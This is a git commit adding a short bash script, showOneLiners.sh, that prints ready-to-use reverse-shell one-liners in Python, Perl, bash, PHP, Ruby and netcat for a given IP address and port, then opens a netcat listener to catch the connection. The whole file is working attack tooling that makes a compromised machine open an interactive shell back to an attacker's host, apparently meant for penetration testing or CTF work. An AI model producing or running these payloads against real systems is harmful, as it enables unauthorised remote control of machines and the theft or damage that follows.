1823685b4a19a0a1d2383d8e895ffc4bb9ebea90
atstpls <25083331+atstpls@users.noreply.github.com>
2020-01-08 14:49:00 -0600

    Create showOneLiners.sh

---
+++ showOneLiners.sh
@@ -0,0 +1,28 @@
+#!/bin/bash 
+
+printf "\n"
+printf "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+printf "\n\n"
+
+printf "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+printf "\n\n"
+
+printf "perl -e 'use Socket;\$i=\"$1\";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
+printf "\n\n"
+
+printf "bash -i >& /dev/tcp/$1/$2 0>&1"
+printf '\n\n'
+
+printf "php -r '$sock=fsockopen(\"$1\",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+printf "\n\n"
+
+printf "ruby -rsocket -e'f=TCPSocket.open(\"$1\",$2).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+printf "\n\n"
+
+printf "nc -e /bin/sh $1 $2"
+printf "\n\n"
+
+printf "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"
+printf "\n\n"
+
+nc -nlvp $2
